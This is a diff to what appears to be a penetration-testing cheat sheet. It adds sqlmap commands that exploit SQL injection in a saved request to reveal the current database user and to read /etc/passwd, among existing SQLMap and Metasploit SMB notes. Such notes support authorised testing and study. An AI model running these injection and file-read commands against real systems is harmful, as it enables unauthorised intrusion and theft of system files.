@@ -100,6 +100,10 @@ select * from "TABLE"
 ## SQLMAP:
 sqlmap -r request.txt -a --batch (request should have parameters like test:test for easy sql)
 sqlmap -u 'URL' --forms --dump
+sqlmap -r request.txt --batch --current-user
+sqlmap -r request.txt --batch --file-read=/etc/passwd
+sqlmap -r request.txt --batch --dbms mysql --threads 10 --file-read=/etc/passwd
+sqlmap -r request.txt --batch --threads 10 --file-read=/etc/passwd
 
 ## SMB:
 msfconsole:- "AUXILIARY/SCANNER/SMB/SMB_VERSION" *Use this to get SMB Version*
